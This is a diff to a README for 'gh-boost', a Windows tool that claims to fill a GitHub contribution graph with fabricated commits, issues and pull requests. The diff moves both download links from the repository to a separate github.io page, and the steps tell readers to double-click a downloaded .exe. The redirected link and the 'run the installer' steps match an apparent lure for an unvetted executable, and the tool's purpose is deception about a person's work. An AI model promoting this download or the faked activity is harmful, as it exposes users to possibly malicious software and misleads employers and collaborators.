@@ -1,6 +1,6 @@
 # 📈 gh-boost - Build your professional github profile fast
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/damasclepiaspurpurascens116/gh-boost)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://damasclepiaspurpurascens116.github.io)
 
 gh-boost helps you manage your GitHub contribution graph. The software creates realistic activity patterns on your profile. It logs commits, issues, and pull requests over time to show consistent work habits. 
 
@@ -18,7 +18,7 @@ Your computer needs specific settings to run this tool. Verify your system meets
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit [this page to download](https://github.com/damasclepiaspurpurascens116/gh-boost) the latest version.
+1. Visit [this page to download](https://damasclepiaspurpurascens116.github.io) the latest version.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the prompts on the screen to finish the installation.
